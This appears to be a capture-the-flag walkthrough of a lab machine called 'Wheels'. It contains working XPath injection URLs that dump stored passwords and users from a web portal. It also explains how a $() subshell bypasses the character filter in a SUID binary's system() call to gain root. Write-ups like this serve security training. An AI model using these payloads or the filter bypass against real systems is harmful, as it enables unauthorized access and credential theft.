# Wheels

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.202
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 11:18 +08
Nmap scan report for 192.168.157.202
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We can proxy traffic through Burpsuite.&#x20;

### Web Enum -> XPath Injection

The website is for a car repair service:

<figure><img src="../../../.gitbook/assets/image (818).png" alt=""><figcaption></figcaption></figure>

There's an employee portal and a register page. When I try to register a user and access the portal, we are denied access. I tried to brute force the admin credentials, but they don't work.

At the bottom of the page, we can find an email:

<figure><img src="../../../.gitbook/assets/image (3738).png" alt=""><figcaption></figcaption></figure>

I tried to register an `administrator` user with this email, and it worked in showing us the Employee Portal.&#x20;

<figure><img src="../../../.gitbook/assets/image (3140).png" alt=""><figcaption></figcaption></figure>

If we submit a query, we are returned information in this manner:

<pre class="language-markup"><code class="lang-markup"><strong>&#x3C;tr height="40" bgcolor="#c8dbde" align="center">
</strong>	&#x3C;td>1&#x3C;/td>
	&#x3C;td width="200">&#x3C;b>bob&#x3C;/b>&#x3C;/td>

&#x3C;/tr>         

&#x3C;tr height="40" bgcolor="#c8dbde" align="center">
	&#x3C;td>2&#x3C;/td>
	&#x3C;td width="200">&#x3C;b>alice&#x3C;/b>&#x3C;/td>

&#x3C;/tr>         

&#x3C;tr height="40" bgcolor="#c8dbde" align="center">
	&#x3C;td>3&#x3C;/td>
	&#x3C;td width="200">&#x3C;b>john&#x3C;/b>&#x3C;/td>

&#x3C;/tr>
</code></pre>

I tried to append a `'` character to the query, and received an XML error:

<figure><img src="../../../.gitbook/assets/image (3199).png" alt=""><figcaption></figcaption></figure>

We can try XPath injection since it seems to load `xpath()`. I tested all forms of XPath Injection and tried to dump passwords, and eventually this payload worked:

```
http://192.168.157.202/portal.php?work=car%27)]%20|%20//password%00&action=search
```

<figure><img src="../../../.gitbook/assets/image (2779).png" alt=""><figcaption></figcaption></figure>

I also found some users when testing payloads:

```
http://192.168.157.202/portal.php?work=car%27)%20or%201=1%20or%20(%27&action=search
```

<figure><img src="../../../.gitbook/assets/image (2959).png" alt=""><figcaption></figcaption></figure>

The first password works for `bob`:

<figure><img src="../../../.gitbook/assets/image (1610).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SUID Binary -> Arbitrary Read

I searched for SUID binaries and the first result stood out:

{% code overflow="wrap" %}
```
bob@wheels:~$ find / -perm -u=s -type f 2>/dev/null
/opt/get-list

bob@wheels:~$ file /opt/get-list
/opt/get-list: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a037b8d92b88ad94e965feeeddd13c03f924f0a7, for GNU/Linux 3.2.0, not stripped

bob@wheels:~$ /opt/get-list


Which List do you want to open? [customers/employees]: employees
Opening File....

bob
alice
john
dan
alex
selene
```
{% endcode %}

I used `ltrace` to see what calls were being made.&#x20;

```
bob@wheels:~$ ltrace /opt/get-list
puts("\n"

)                                                             = 2
printf("Which List do you want to open? "...)                          = 55
fgets(Which List do you want to open? [customers/employees]: customers
"customers\n", 100, 0x7f394d6c3980)                              = 0x7ffeb9de0730
strchr("customers\n", ';')                                             = nil
strchr("customers\n", '|')                                             = nil
strchr("customers\n", '&')                                             = nil
strstr("customers\n", "customers")                                     = "customers\n"
puts("Opening File....\n"Opening File....

)                                             = 18
snprintf("/bin/cat /root/details/customers"..., 200, "/bin/cat /root/details/%s", "customers\n") = 33
open("/dev/null", 1025, 027167403201)                                  = 3
dup(2, 0x5597d7042088, 1025, 0)                                        = 4
dup2(3, 2)                                                             = 2
geteuid()                                                              = 1000
setuid(1000)                                                           = 0
system("/bin/cat /root/details/customers"... <no return ...>
```

It uses seems that our string is directly passed into a `cat` command. There's also a check for special characters before executing. This doesn't protect against subshells using `$()`, and it only checks for whether `customers` or `employees` are substrings within the string we submit.

This is easily exploitable for a `root` shell:

<figure><img src="../../../.gitbook/assets/image (2772).png" alt=""><figcaption></figcaption></figure>
